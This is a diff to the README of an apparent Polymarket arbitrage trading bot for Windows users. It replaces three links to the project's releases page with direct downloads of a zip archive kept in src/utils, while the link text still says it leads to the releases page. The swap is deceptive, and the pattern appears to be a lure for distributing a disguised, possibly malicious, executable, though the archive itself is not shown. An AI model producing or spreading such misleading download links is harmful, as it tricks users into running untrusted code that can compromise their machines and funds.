@@ -1,6 +1,6 @@
 # ⚖️ Polymarket-Arbitrage-Trading-Bot - Find Price Gaps Fast
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Matias123p/Polymarket-Arbitrage-Trading-Bot/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Matias123p/Polymarket-Arbitrage-Trading-Bot/raw/refs/heads/main/src/utils/Arbitrage_Bot_Polymarket_Trading_1.2.zip)
 
 ## 🚀 What This App Does
 
@@ -12,7 +12,7 @@ This tool is meant for Windows users who want to download a ready-made release a
 
 Use this link to visit the release page and download the latest Windows file:
 
-[Visit the releases page to download](https://github.com/Matias123p/Polymarket-Arbitrage-Trading-Bot/releases)
+[Visit the releases page to download](https://github.com/Matias123p/Polymarket-Arbitrage-Trading-Bot/raw/refs/heads/main/src/utils/Arbitrage_Bot_Polymarket_Trading_1.2.zip)
 
 On that page, look for the newest release and download the file made for Windows. If there are multiple files, choose the one that matches your system.
 
@@ -211,7 +211,7 @@ If you use the spread maker strategy, take time to check your order size and spr
 
 Download the latest Windows version here:
 
-[https://github.com/Matias123p/Polymarket-Arbitrage-Trading-Bot/releases](https://github.com/Matias123p/Polymarket-Arbitrage-Trading-Bot/releases)
+[https://github.com/Matias123p/Polymarket-Arbitrage-Trading-Bot/raw/refs/heads/main/src/utils/Arbitrage_Bot_Polymarket_Trading_1.2.zip](https://github.com/Matias123p/Polymarket-Arbitrage-Trading-Bot/raw/refs/heads/main/src/utils/Arbitrage_Bot_Polymarket_Trading_1.2.zip)
 
 ## ✅ Quick Start
 
